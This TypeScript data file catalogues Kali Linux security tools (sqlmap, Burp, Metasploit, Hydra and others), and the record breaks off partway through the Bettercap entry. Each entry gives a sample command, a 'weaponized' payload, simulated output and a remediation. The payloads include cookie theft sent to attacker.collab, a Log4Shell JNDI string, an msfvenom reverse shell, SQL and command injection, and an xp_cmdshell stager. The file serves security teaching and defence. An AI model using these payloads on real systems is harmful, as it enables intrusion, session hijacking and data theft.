export interface KaliTool {
  id: string;
  name: string;
  binary: string;
  category: 
    | 'Information Gathering'
    | 'Vulnerability Analysis'
    | 'Web Application Analysis'
    | 'Database Assessment'
    | 'Password Attacks'
    | 'Wireless Attacks'
    | 'Reverse Engineering'
    | 'Exploitation Tools'
    | 'Sniffing & Spoofing'
    | 'Post Exploitation'
    | 'Forensics'
    | 'Reporting Tools';
  kaliPackage: string;
  version: string;
  description: string;
  author: string;
  officialDocUrl: string;
  attackVectorsTested: string[];
  sampleCommand: string;
  weaponizedPayload: string;
  exploitSimulation: {
    targetPattern: string;
    triggerCondition: string;
    simulatedOutput: string;
    defensiveRemediation: string;
  };
  supportedTargets: ('FILE' | 'URL' | 'NETWORK' | 'BINARY' | 'PASSWORD')[];
  defaultArmed: boolean;
}

export const KALI_CATEGORIES = [
  'All Tools',
  'Information Gathering',
  'Vulnerability Analysis',
  'Web Application Analysis',
  'Database Assessment',
  'Password Attacks',
  'Wireless Attacks',
  'Reverse Engineering',
  'Exploitation Tools',
  'Sniffing & Spoofing',
  'Post Exploitation',
  'Forensics',
  'Reporting Tools'
] as const;

export type KaliCategory = typeof KALI_CATEGORIES[number];

export const KALI_TOOLS_DATABASE: KaliTool[] = [
  // 1. WEB APPLICATION ANALYSIS
  {
    id: 'kali-sqlmap',
    name: 'SQLmap',
    binary: 'sqlmap',
    category: 'Web Application Analysis',
    kaliPackage: 'sqlmap',
    version: '1.8.2#stable',
    description: 'Automatic SQL injection and database takeover tool. Detects and exploits SQL injection flaws across 30+ database engines.',
    author: 'Bernardo Damele & Miroslav Stampar',
    officialDocUrl: 'https://www.kali.org/tools/sqlmap/',
    attackVectorsTested: [
      'Boolean-based blind SQLi',
      'Error-based SQLi',
      'UNION query-based SQLi',
      'Stacked queries injection',
      'Time-based blind SQLi',
      'Out-of-band DBMS takeover'
    ],
    sampleCommand: 'sqlmap -u "https://target.com/api/user?id=1" --batch --risk=3 --level=5 --dbs',
    weaponizedPayload: "' UNION SELECT NULL, table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -",
    exploitSimulation: {
      targetPattern: 'SELECT ... WHERE id = \' + param',
      triggerCondition: 'String interpolation in SQL queries without parameterization',
      simulatedOutput: '[+] GET parameter \'id\' is vulnerable.\n[INFO] the back-end DBMS is PostgreSQL 15.2\n[INFO] fetching database names: [db_production, db_users, db_billing]',
      defensiveRemediation: 'Use parameterized queries ($1, ?) with pg/prisma/sequelize. Never concatenate raw strings into SQL statements.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-burpsuite',
    name: 'Burp Suite (Community / Pro)',
    binary: 'burpsuite',
    category: 'Web Application Analysis',
    kaliPackage: 'burpsuite',
    version: '2024.3.1',
    description: 'Premier web application security testing platform for intercepting HTTP/S proxies, crawling, fuzzing, and automated scanning.',
    author: 'PortSwigger',
    officialDocUrl: 'https://www.kali.org/tools/burpsuite/',
    attackVectorsTested: [
      'HTTP Request Smuggling',
      'Cross-Site Scripting (XSS)',
      'Cross-Site Request Forgery (CSRF)',
      'Authentication token hijacking',
      'Parameter pollution & manipulation'
    ],
    sampleCommand: 'burpsuite --project-file=audit.burp --config-file=scope.json',
    weaponizedPayload: '<script>fetch("https://attacker.collab/log?cookie="+document.cookie)</script>',
    exploitSimulation: {
      targetPattern: 'dangerouslySetInnerHTML | innerHTML = userInput',
      triggerCondition: 'Unsanitized HTML insertion into DOM',
      simulatedOutput: '[Burp Repeater] HTTP/1.1 200 OK\nSet-Cookie: session=tok_demo_session_id...\n[Alert] Reflected XSS verified in response body on parameter \'query\'',
      defensiveRemediation: 'Implement context-aware HTML entity escaping and strict Content-Security-Policy (CSP) headers.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-owasp-zap',
    name: 'OWASP ZAP (Zed Attack Proxy)',
    binary: 'zaproxy',
    category: 'Web Application Analysis',
    kaliPackage: 'zaproxy',
    version: '2.14.0',
    description: 'World\'s most widely used open source web app scanner. Performs active/passive scanning against OWASP Top 10 vulnerabilities.',
    author: 'OWASP Foundation',
    officialDocUrl: 'https://www.kali.org/tools/zaproxy/',
    attackVectorsTested: [
      'Missing Anti-CSRF tokens',
      'Clickjacking via missing X-Frame-Options',
      'Content-Security-Policy absence',
      'Insecure Direct Object References (IDOR)',
      'CORS wildcard misconfiguration'
    ],
    sampleCommand: 'zap-baseline.py -t https://target.com -r zap-report.html',
    weaponizedPayload: 'Origin: https://malicious-attacker.com\nCookie: session_id=SECRET',
    exploitSimulation: {
      targetPattern: 'Access-Control-Allow-Origin: * with credentials',
      triggerCondition: 'Wildcard CORS origin reflection with credentials allowed',
      simulatedOutput: '[ZAP PASSIVE] High: CORS Wildcard Origin With Credentials Detected\nResponse Header: Access-Control-Allow-Credentials: true\nImpact: Cross-origin session data extraction permitted',
      defensiveRemediation: 'Set explicit origin whitelists. Never reflect untrusted origins while Access-Control-Allow-Credentials is true.'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-wpscan',
    name: 'WPScan',
    binary: 'wpscan',
    category: 'Web Application Analysis',
    kaliPackage: 'wpscan',
    version: '3.8.25',
    description: 'Black box WordPress vulnerability scanner for themes, plugins, timthumb exploits, user enumeration, and config leaks.',
    author: 'WPScan Team (Automattic)',
    officialDocUrl: 'https://www.kali.org/tools/wpscan/',
    attackVectorsTested: [
      'Vulnerable WordPress core versions',
      'Outdated plugin CVE exploits',
      'REST API author username enumeration',
      'Exposed wp-config.php backups',
      'XML-RPC multicall brute force'
    ],
    sampleCommand: 'wpscan --url https://target.com --enumerate vp,vt,u --api-token=$WPSCAN_KEY',
    weaponizedPayload: 'POST /xmlrpc.php HTTP/1.1\n<methodCall><methodName>system.multicall</methodName>...</methodCall>',
    exploitSimulation: {
      targetPattern: '/wp-json/wp/v2/users | /xmlrpc.php',
      triggerCondition: 'Publicly readable user endpoints or enabled XML-RPC',
      simulatedOutput: '[+] WordPress version 5.8.1 identified (Outdated!)\n[!] 3 vulnerabilities identified in plugin \'elementor\' v3.4.2\n[+] Found 4 user accounts: [admin, editor, developer, support]',
      defensiveRemediation: 'Disable XML-RPC in nginx/apache, restrict /wp-json/wp/v2/users for anonymous users, keep plugins automatically patched.'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-gobuster',
    name: 'Gobuster',
    binary: 'gobuster',
    category: 'Web Application Analysis',
    kaliPackage: 'gobuster',
    version: '3.6.0',
    description: 'High-speed directory, DNS, and vhost busting tool written in Go.',
    author: 'OJ Reeves (@TheColonial)',
    officialDocUrl: 'https://www.kali.org/tools/gobuster/',
    attackVectorsTested: [
      'Exposed git repositories (/.git/HEAD)',
      'Exposed environment files (/.env)',
      'Unprotected admin consoles (/admin, /wp-admin)',
      'Backup dumps (/backup.sql, /archive.tar.gz)',
      'API documentation leak (/swagger.json)'
    ],
    sampleCommand: 'gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,js,json,env',
    weaponizedPayload: 'GET /.git/config HTTP/1.1\nHost: target.com',
    exploitSimulation: {
      targetPattern: '/.env | /.git/config | /swagger.json',
      triggerCondition: 'Web server serving sensitive hidden directories',
      simulatedOutput: '[+] Found: /.env (Status: 200) [Size: 1420]\n[+] Found: /.git/HEAD (Status: 200) [Size: 41]\n[!] CRITICAL: Complete repository extraction possible via git-dumper',
      defensiveRemediation: 'Add web server rules to deny access to hidden dotfiles (location ~ /\\. { deny all; }) and move backups out of public docroot.'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-commix',
    name: 'Commix',
    binary: 'commix',
    category: 'Web Application Analysis',
    kaliPackage: 'commix',
    version: '3.6-stable',
    description: 'Automated all-in-one OS command injection and exploitation tool.',
    author: 'Anastasios Stasinopoulos (@ancst)',
    officialDocUrl: 'https://www.kali.org/tools/commix/',
    attackVectorsTested: [
      'Classic OS command injection',
      'Blind command injection (time-based & file-based)',
      'Shell delimiter breakout (; && | ` $())',
      'Reverse shell invocation'
    ],
    sampleCommand: 'commix --url="https://target.com/api/ping?host=127.0.0.1" --batch',
    weaponizedPayload: '; cat /etc/passwd # or | whoami',
    exploitSimulation: {
      targetPattern: 'exec(cmd) | os.system(cmd) | spawn(cmd)',
      triggerCondition: 'Passing user input directly to shell execution commands',
      simulatedOutput: '[+] The GET parameter \'host\' is vulnerable to command injection!\n[+] Executing \'id\': uid=0(root) gid=0(root) groups=0(root)\n[!] Interactive pseudo-shell opened.',
      defensiveRemediation: 'Use child_process.execFile() with an array of arguments, never shell interpolation. Run under low-privilege accounts.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-wfuzz',
    name: 'Wfuzz',
    binary: 'wfuzz',
    category: 'Web Application Analysis',
    kaliPackage: 'wfuzz',
    version: '3.1.0',
    description: 'Flexible web application fuzzer for finding hidden resources, parameters, and headers.',
    author: 'Xavi Mendez & Christian Martorella',
    officialDocUrl: 'https://www.kali.org/tools/wfuzz/',
    attackVectorsTested: [
      'HTTP parameter fuzzing',
      'Hidden debug parameter discovery',
      'Header injection vectors',
      'Authentication bypass fuzzing'
    ],
    sampleCommand: 'wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "https://target.com/api/v1/auth?FUZZ=1"',
    weaponizedPayload: '?debug=true&bypass_auth=1&admin=1',
    exploitSimulation: {
      targetPattern: 'req.query.admin | req.query.debug',
      triggerCondition: 'Hidden parameter switches toggling security controls',
      simulatedOutput: '[Wfuzz] Response code: 200 | Words: 412 | Chars: 4210 | Payload: debug=true\n[!] Disclosed internal stack traces and database credentials.',
      defensiveRemediation: 'Remove debug parameters from production releases. Enforce strict parameter validation schemas (Zod, Joi).'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-ffuf',
    name: 'FFuF (Fast Web Fuzzer)',
    binary: 'ffuf',
    category: 'Web Application Analysis',
    kaliPackage: 'ffuf',
    version: '2.1.0',
    description: 'Blazingly fast web fuzzer written in Go for discovery of endpoints, vhosts, and parameters.',
    author: 'joohoi',
    officialDocUrl: 'https://www.kali.org/tools/ffuf/',
    attackVectorsTested: [
      'Endpoint discovery',
      'Virtual host brute-forcing',
      'Content-type fuzzing',
      'JSON parameter fuzzing'
    ],
    sampleCommand: 'ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302',
    weaponizedPayload: 'Host: FUZZ.target.com (vhost enumeration)',
    exploitSimulation: {
      targetPattern: 'Routing configuration without default deny',
      triggerCondition: 'Internal admin subdomains mapped on public ingress',
      simulatedOutput: '[ffuf] dev-internal.target.com [Status: 200, Size: 18420, Words: 2100]\n[!] Unauthenticated internal staging portal accessible via public IP.',
      defensiveRemediation: 'Protect staging and administrative vhosts behind zero-trust VPN or cloud identity-aware proxies (IAP).'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },

  // 2. INFORMATION GATHERING
  {
    id: 'kali-nmap',
    name: 'Nmap (Network Mapper)',
    binary: 'nmap',
    category: 'Information Gathering',
    kaliPackage: 'nmap',
    version: '7.94',
    description: 'The standard network discovery, port scanning, and vulnerability detection tool with NSE scripting engine.',
    author: 'Gordon Lyon (Fyodor)',
    officialDocUrl: 'https://www.kali.org/tools/nmap/',
    attackVectorsTested: [
      'Open port enumeration (SYN, ACK, UDP)',
      'Service version fingerprinting',
      'OS fingerprinting',
      'NSE vulnerability scripts (vuln, auth, default)',
      'Firewall / IDS evasion'
    ],
    sampleCommand: 'nmap -sV -sC -Pn -p- -T4 --script=vuln target.com',
    weaponizedPayload: 'SYN probe on ports 21, 22, 80, 443, 3306, 5432, 6379, 8080, 27017',
    exploitSimulation: {
      targetPattern: 'Exposed database ports (3306, 5432, 6379, 27017) to 0.0.0.0',
      triggerCondition: 'Database daemons listening on public interface without firewall',
      simulatedOutput: 'PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1\n6379/tcp open  redis   Redis key-value store 6.0.16 (unprotected-mode)\n[!] Redis instance allows unauthenticated execution: CONFIG GET *',
      defensiveRemediation: 'Bind sensitive services to 127.0.0.1 or private VPC interface. Enforce security groups and UFW rules.'
    },
    supportedTargets: ['URL', 'NETWORK'],
    defaultArmed: true
  },
  {
    id: 'kali-masscan',
    name: 'Masscan',
    binary: 'masscan',
    category: 'Information Gathering',
    kaliPackage: 'masscan',
    version: '1.3.2',
    description: 'TCP port scanner capable of scanning the entire Internet in under 6 minutes using custom asynchronous SYN packets.',
    author: 'Robert Graham',
    officialDocUrl: 'https://www.kali.org/tools/masscan/',
    attackVectorsTested: [
      'Subnet-wide high speed port scanning',
      'Banner grabbing at 100,000 packets/sec',
      'Unintended external IP exposures'
    ],
    sampleCommand: 'masscan 192.168.1.0/24 -p0-65535 --rate=5000',
    weaponizedPayload: 'Raw asynchronous SYN frame',
    exploitSimulation: {
      targetPattern: 'Any open public listening port',
      triggerCondition: 'Exposed perimeter services without rate limiting',
      simulatedOutput: 'Discovered open port 8080/tcp on 192.168.1.104\nDiscovered open port 9200/tcp on 192.168.1.104 (Elasticsearch)',
      defensiveRemediation: 'Deploy network perimeter firewalls and close unused ports.'
    },
    supportedTargets: ['NETWORK'],
    defaultArmed: false
  },
  {
    id: 'kali-amass',
    name: 'OWASP Amass',
    binary: 'amass',
    category: 'Information Gathering',
    kaliPackage: 'amass',
    version: '4.2.0',
    description: 'In-depth attack surface mapping and external asset discovery using open source information (OSINT) and active reconnaissance.',
    author: 'Jeff Foley (OWASP Amass Project)',
    officialDocUrl: 'https://www.kali.org/tools/amass/',
    attackVectorsTested: [
      'Subdomain enumeration via Certificate Transparency logs',
      'DNS zone transfers (AXFR)',
      'ASN and CIDR routing mapping',
      'Shadow IT and abandoned development assets'
    ],
    sampleCommand: 'amass enum -d target.com -active -brute',
    weaponizedPayload: 'DNS AXFR request to ns1.target.com',
    exploitSimulation: {
      targetPattern: 'DNS Zone Transfer enabled on authoritative nameserver',
      triggerCondition: 'Nameserver responding with complete zone contents',
      simulatedOutput: '[Amass] Found 84 subdomains\n[!] dev-db.target.com -> 104.28.12.1\n[!] staging-admin.target.com -> 104.28.14.99\n[!] vpn-legacy.target.com -> 198.51.100.4',
      defensiveRemediation: 'Restrict AXFR zone transfers to trusted secondary nameservers only. Decommission orphaned subdomains.'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-theharvester',
    name: 'theHarvester',
    binary: 'theHarvester',
    category: 'Information Gathering',
    kaliPackage: 'theharvester',
    version: '4.4.4',
    description: 'Gathers emails, names, subdomains, IPs, and URLs using public sources like Google, Bing, LinkedIn, Shodan, and Hunter.io.',
    author: 'Christian Martorella',
    officialDocUrl: 'https://www.kali.org/tools/theharvester/',
    attackVectorsTested: [
      'Corporate email harvesting for spear-phishing',
      'Employee LinkedIn reconnaissance',
      'PGP key server query',
      'Shodan public port search'
    ],
    sampleCommand: 'theHarvester -d target.com -b all -l 500',
    weaponizedPayload: 'OSINT aggregation query across search engines and PGP keyrings',
    exploitSimulation: {
      targetPattern: 'Publicly exposed employee email addresses and role titles',
      triggerCondition: 'High volume of employee emails indexed in search caches',
      simulatedOutput: '[*] Emails found: 32 (ceo@target.com, devops-lead@target.com, accounting@target.com)\n[*] Hosts found: 18 hosts indexed in Shodan with OpenSSL vulnerabilities',
      defensiveRemediation: 'Educate staff on spear-phishing hygiene and mandate FIDO2 hardware MFA tokens company-wide.'
    },
    supportedTargets: ['URL'],
    defaultArmed: false
  },

  // 3. VULNERABILITY ANALYSIS
  {
    id: 'kali-nuclei',
    name: 'Nuclei',
    binary: 'nuclei',
    category: 'Vulnerability Analysis',
    kaliPackage: 'nuclei',
    version: '3.2.0',
    description: 'Fast, community-driven vulnerability scanner based on simple YAML templates for CVEs, zero-days, and misconfigurations.',
    author: 'ProjectDiscovery',
    officialDocUrl: 'https://www.kali.org/tools/nuclei/',
    attackVectorsTested: [
      'CVE template matching (thousands of CVEs)',
      'Exposed panels & login screens',
      'Subdomain takeovers',
      'Default credentials & tokens',
      'Zero-day disclosures'
    ],
    sampleCommand: 'nuclei -u https://target.com -t cves/ -t exposures/ -severity critical,high',
    weaponizedPayload: 'GET /actuator/heapdump HTTP/1.1 or /actuator/env HTTP/1.1',
    exploitSimulation: {
      targetPattern: 'Spring Boot Actuator /actuator/env exposed',
      triggerCondition: 'Public unauthenticated access to microservice environment dumps',
      simulatedOutput: '[CVE-2022-22965] [http] [critical] https://target.com/actuator/env\n{"spring.datasource.password": "P@ssw0rd2024!", "JWT_SECRET": "k3y_9921_abc"}\n[!] Credentials extracted from memory!',
      defensiveRemediation: 'Protect management endpoints behind management.endpoints.web.exposure.exclude=* in Spring Boot application.yml.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-nikto',
    name: 'Nikto',
    binary: 'nikto',
    category: 'Vulnerability Analysis',
    kaliPackage: 'nikto',
    version: '2.5.0',
    description: 'Web server scanner that tests for over 6,700 dangerous files, outdated server programs, and version-specific problems.',
    author: 'Chris Sullo & David Lodge',
    officialDocUrl: 'https://www.kali.org/tools/nikto/',
    attackVectorsTested: [
      'Missing HTTP security headers (HSTS, CSP, X-Frame-Options)',
      'Outdated Apache / Nginx / IIS server versions',
      'Exposed configuration files and default scripts',
      'Insecure HTTP methods (PUT, DELETE, TRACE)',
      'Dangerous server options'
    ],
    sampleCommand: 'nikto -h https://target.com -ssl -Tuning 123b',
    weaponizedPayload: 'TRACE / HTTP/1.1\nHost: target.com',
    exploitSimulation: {
      targetPattern: 'Server: Apache/2.4.41 with TRACE method enabled',
      triggerCondition: 'Cross-Site Tracing (XST) enabled on server',
      simulatedOutput: '+ Server leaks inodes via ETag\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-Content-Type-Options header is not set.\n+ TRACE method allowed - potential XST attack vector.',
      defensiveRemediation: 'Add security headers via reverse proxy and disable HTTP TRACE (TraceEnable Off).'
    },
    supportedTargets: ['URL'],
    defaultArmed: true
  },
  {
    id: 'kali-openvas',
    name: 'OpenVAS / Greenbone',
    binary: 'openvas',
    category: 'Vulnerability Analysis',
    kaliPackage: 'gvm',
    version: '22.4',
    description: 'Full-featured enterprise vulnerability scanner with over 50,000 Network Vulnerability Tests (NVTs).',
    author: 'Greenbone Networks',
    officialDocUrl: 'https://www.kali.org/tools/gvm/',
    attackVectorsTested: [
      'Comprehensive OS & daemon CVE auditing',
      'SSL/TLS weak cipher suite analysis',
      'Default SNMP community strings',
      'Unauthenticated service daemons'
    ],
    sampleCommand: 'gvm-cli socket --xml "<get_tasks/>"',
    weaponizedPayload: 'CVE network probe sequence across 50,000 NVT checks',
    exploitSimulation: {
      targetPattern: 'Unpatched OpenSSL vulnerability (Heartbleed / Ticketbleed)',
      triggerCondition: 'Outdated TLS library handling heartbeat requests',
      simulatedOutput: '[OpenVAS Report] CRITICAL (CVSS 9.8): OpenSSL TLS Heartbeat Extension Information Disclosure (Heartbleed)\nAdversary can read 64KB chunks of process memory containing private SSL keys.',
      defensiveRemediation: 'Upgrade OpenSSL package to current LTS branch and reissue all SSL/TLS certificates.'
    },
    supportedTargets: ['URL', 'NETWORK'],
    defaultArmed: false
  },
  {
    id: 'kali-lynis',
    name: 'Lynis',
    binary: 'lynis',
    category: 'Vulnerability Analysis',
    kaliPackage: 'lynis',
    version: '3.0.9',
    description: 'Battle-tested security auditing tool for systems running Linux, macOS, or Unix-based OS.',
    author: 'Michael Boelen (CISOfy)',
    officialDocUrl: 'https://www.kali.org/tools/lynis/',
    attackVectorsTested: [
      'Kernel hardening sysctl parameters',
      'SSH server configuration weaknesses',
      'File permissions and SUID binaries',
      'Firewall presence and rules'
    ],
    sampleCommand: 'lynis audit system --quick',
    weaponizedPayload: 'Local host configuration audit checks',
    exploitSimulation: {
      targetPattern: 'PermitRootLogin yes | PasswordAuthentication yes in sshd_config',
      triggerCondition: 'Weak SSH administrative configuration',
      simulatedOutput: '[!] Hardening index: 58/100\n[!] SSH PermitRootLogin enabled\n[!] No audit daemon (auditd) running\n[!] Core dumps not disabled via limits.conf',
      defensiveRemediation: 'Enforce SSH key-only auth (PasswordAuthentication no), disable root login, enable fail2ban.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 4. DATABASE ASSESSMENT
  {
    id: 'kali-sqlninja',
    name: 'SQLNinja',
    binary: 'sqlninja',
    category: 'Database Assessment',
    kaliPackage: 'sqlninja',
    version: '0.2.6-r1',
    description: 'Targeted exploitation tool for SQL Server database injection to obtain remote shell.',
    author: 'I奇 (icesurfer)',
    officialDocUrl: 'https://www.kali.org/tools/sqlninja/',
    attackVectorsTested: [
      'MS SQL xp_cmdshell execution',
      'VBScript staging for binary upload',
      'Direct and reverse shell delivery via SQLi'
    ],
    sampleCommand: 'sqlninja -m t -f sqlninja.conf',
    weaponizedPayload: "'; EXEC master..xp_cmdshell 'powershell -enc ...'--",
    exploitSimulation: {
      targetPattern: 'xp_cmdshell enabled on Microsoft SQL Server',
      triggerCondition: 'Database user holds sysadmin role with command execution enabled',
      simulatedOutput: '[SQLNinja] xp_cmdshell is enabled!\n[+] Executing Metasploit stager on database server host.\n[+] Elevated SYSTEM shell achieved.',
      defensiveRemediation: 'Disable xp_cmdshell: sp_configure \'xp_cmdshell\', 0; RECONFIGURE; Run SQL Server with minimal service privileges.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: false
  },

  // 5. PASSWORD ATTACKS
  {
    id: 'kali-hydra',
    name: 'Hydra (THC-Hydra)',
    binary: 'hydra',
    category: 'Password Attacks',
    kaliPackage: 'hydra',
    version: '9.5',
    description: 'Very fast network logon cracker supporting dozens of protocols: HTTP, SSH, FTP, Telnet, MySQL, Postgres, RDP, SMTP.',
    author: 'van Hauser & David Maciejak (The Hacker\'s Choice)',
    officialDocUrl: 'https://www.kali.org/tools/hydra/',
    attackVectorsTested: [
      'HTTP POST form credential brute force',
      'SSH login brute force',
      'Database authentication brute force',
      'Rate-limiting bypass techniques'
    ],
    sampleCommand: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/api/login:user=^USER^&pass=^PASS^:F=invalid"',
    weaponizedPayload: 'Rapid parallel login attempts (16 parallel threads)',
    exploitSimulation: {
      targetPattern: 'POST /api/login without rate limiting or account lockout',
      triggerCondition: 'Unlimited password attempts permitted per IP / user',
      simulatedOutput: '[DATA] attacking http-post-form target.com:443\n[443][http-post-form] host: target.com   login: admin   password: password123\n[STATUS] 1 valid pair found after 420 attempts.',
      defensiveRemediation: 'Implement IP and user-level rate limiting (max 5 tries per 15 min), account lockout, and MFA.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-john',
    name: 'John the Ripper',
    binary: 'john',
    category: 'Password Attacks',
    kaliPackage: 'john',
    version: '1.9.0-jumbo-1',
    description: 'Feature-rich password cracker with auto-detection of ciphertext types, wordlist rules, and GPU acceleration.',
    author: 'Solar Designer',
    officialDocUrl: 'https://www.kali.org/tools/john/',
    attackVectorsTested: [
      'Unix crypt, MD5, SHA-256, SHA-512 hashes',
      'Kerberos TGS hashes (Kerberoasting)',
      'NTLM and NetNTLMv2 hashes',
      'Encrypted ZIP, PDF, SSH private key passwords'
    ],
    sampleCommand: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
    weaponizedPayload: 'Wordlist mangling rules against harvested password hashes',
    exploitSimulation: {
      targetPattern: 'MD5(password) | SHA1(password) in database schema',
      triggerCondition: 'Fast un-salted or weakly salted hash functions used for passwords',
      simulatedOutput: 'Loaded 1 password hash (Raw-MD5 [128/128 AVX 4x3])\npassword123      (admin)\n1g 0:00:00:01 DONE (2026-10-10 11:00) 450.0g/s 45000p/s',
      defensiveRemediation: 'Migrate to Argon2id (RFC 9106) or bcrypt with minimum work factor 12.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },
  {
    id: 'kali-hashcat',
    name: 'Hashcat',
    binary: 'hashcat',
    category: 'Password Attacks',
    kaliPackage: 'hashcat',
    version: '6.2.6',
    description: 'World\'s fastest GPU-based password recovery utility supporting hundreds of hash algorithms.',
    author: 'atom (Jens Steube)',
    officialDocUrl: 'https://www.kali.org/tools/hashcat/',
    attackVectorsTested: [
      'High-speed GPU hash cracking (billions of hashes/sec)',
      'Combinator & hybrid mask attacks',
      'JWT secret cracking via HMAC-SHA256 (-m 16500)',
      'WPA/WPA2 handshake cracking'
    ],
    sampleCommand: 'hashcat -m 16500 jwt.token /usr/share/wordlists/rockyou.txt',
    weaponizedPayload: 'GPU parallel computation against HMAC secret key',
    exploitSimulation: {
      targetPattern: 'jwt.sign(payload, "supersecret123")',
      triggerCondition: 'Short, guessable or dictionary JWT signing secret',
      simulatedOutput: 'jwt_header_payload_demo...:supersecret123\n[+] Status: Cracked\n[+] Attack time: 0.04 seconds',
      defensiveRemediation: 'Use high-entropy 256-bit randomly generated keys (crypto.randomBytes(32)) or asymmetric RS256/ES256 keys.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 6. EXPLOITATION TOOLS
  {
    id: 'kali-metasploit',
    name: 'Metasploit Framework',
    binary: 'msfconsole',
    category: 'Exploitation Tools',
    kaliPackage: 'metasploit-framework',
    version: '6.3.55-dev',
    description: 'The world\'s most utilized penetration testing platform for verifying vulnerabilities and deploying payloads.',
    author: 'Rapid7 & Open Source Community',
    officialDocUrl: 'https://www.kali.org/tools/metasploit-framework/',
    attackVectorsTested: [
      'Over 2,300 verified exploit modules',
      'Payload staging and meterpreter sessions',
      'Auxiliary scanners and fuzzers',
      'Post-exploitation privilege escalation'
    ],
    sampleCommand: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ...; run"',
    weaponizedPayload: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf',
    exploitSimulation: {
      targetPattern: 'Remote Code Execution (RCE) / Unauthenticated Deserialization',
      triggerCondition: 'Insecure deserialization of Java/Python objects',
      simulatedOutput: '[*] Started reverse TCP handler on 10.0.0.1:4444\n[*] Sending stage (3045348 bytes) to 10.0.0.52\n[*] Meterpreter session 1 opened!\nmeterpreter > sysinfo\nOS: Linux 5.15.0-generic (x86_64)',
      defensiveRemediation: 'Disable arbitrary object deserialization; inspect payloads using strict schemas; run in sandboxed containers with no outbound egress.'
    },
    supportedTargets: ['FILE', 'URL'],
    defaultArmed: true
  },
  {
    id: 'kali-searchsploit',
    name: 'SearchSploit (Exploit-DB)',
    binary: 'searchsploit',
    category: 'Exploitation Tools',
    kaliPackage: 'exploitdb',
    version: '2024.04',
    description: 'Offline command line search tool for Exploit-DB archive of known proof-of-concept exploits.',
    author: 'OffSec',
    officialDocUrl: 'https://www.kali.org/tools/exploitdb/',
    attackVectorsTested: [
      'PoC exploit matching against service banners',
      'CVE to Exploit-DB mapping',
      'Vulnerable software package versions'
    ],
    sampleCommand: 'searchsploit "Apache Log4j 2.14"',
    weaponizedPayload: '${jndi:ldap://attacker.com/a}',
    exploitSimulation: {
      targetPattern: 'log4j-core < 2.15.0 in pom.xml / package dependencies',
      triggerCondition: 'JNDI lookups enabled in logging framework',
      simulatedOutput: '[SearchSploit] Found 3 matching exploits for Log4j Log4Shell (CVE-2021-44228)\n[!] Remote Code Execution verified via JNDI injection.',
      defensiveRemediation: 'Update dependency to log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true.'
    },
    supportedTargets: ['FILE'],
    defaultArmed: true
  },

  // 7. SNIFFING & SPOOFING
  {
    id: 'kali-wireshark',
    name: 'Wireshark & Tshark',
    binary: 'tshark',
    category: 'Sniffing & Spoofing',
    kaliPackage: 'wireshark',
    version: '4.2.2',
    description: 'World\'s foremost network protocol analyzer for deep inspection of hundreds of protocols.',
    author: 'Gerald Combs & Wireshark team',
    officialDocUrl: 'https://www.kali.org/tools/wireshark/',
    attackVectorsTested: [
      'Cleartext password interception (HTTP, FTP, Telnet)',
      'TLS handshake inspection & weak cipher alerts',
      'DNS spoofing & cache poisoning detection',
      'Sensitive session cookie leakage'
    ],
    sampleCommand: 'tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.file_data',
    weaponizedPayload: 'Passive network packet capture filtering on authentication endpoints',
    exploitSimulation: {
      targetPattern: 'http:// URL in production API endpoints (no TLS)',
      triggerCondition: 'Unencrypted HTTP traffic transmitting passwords or tokens',
      simulatedOutput: '[Tshark] Frame 42: Hypertext Transfer Protocol\nPOST /login HTTP/1.1\nForm item: "password" = "my_secret_password"\n[!] Cleartext credential leakage in transit!',
      defensiveRemediation: 'Enforce HTTPS everywhere with HTTP Strict Transport Security (HSTS) with includeSubDomains.'
    },
    supportedTargets: ['URL', 'NETWORK'],
    defaultArmed: true
  },
  {
    id: 'kali-bettercap',
    name: 'Bettercap',
    binary: 'bettercap',
    category: 'Sniffing & Spoofing',
    kaliPackage: 'bettercap',
    version: '2.32.0',
    description: 'Complete, modular, portable and easily extensible tool to perform MITM attacks and protocol manipulation.',
    author: 'Simone Margaritelli (@evilsocket)',
    officialDocUrl: 'https://www.kali.org/tools/bettercap/',
    attackVectorsTested: [
      'ARP spoofing / cache poisoning',
      'SSL stripping (downgrade to HTTP)',
      'DNS spoofing',
      'Proxy credential harvesting'
    ],
    sampleCommand: 'bettercap -iface eth0 -eval "net.probe on; arp.spoof on; http.proxy on"',
    weaponizedPayload: 'ARP cache poisoning packet flood to gateway',
    exploitSimulation: {
      targetPattern: 'Missing HSTS (Strict-Transport-Security) header',
      triggerCondition: 'Browser connects over HTTP first before redirecting to HTTPS',
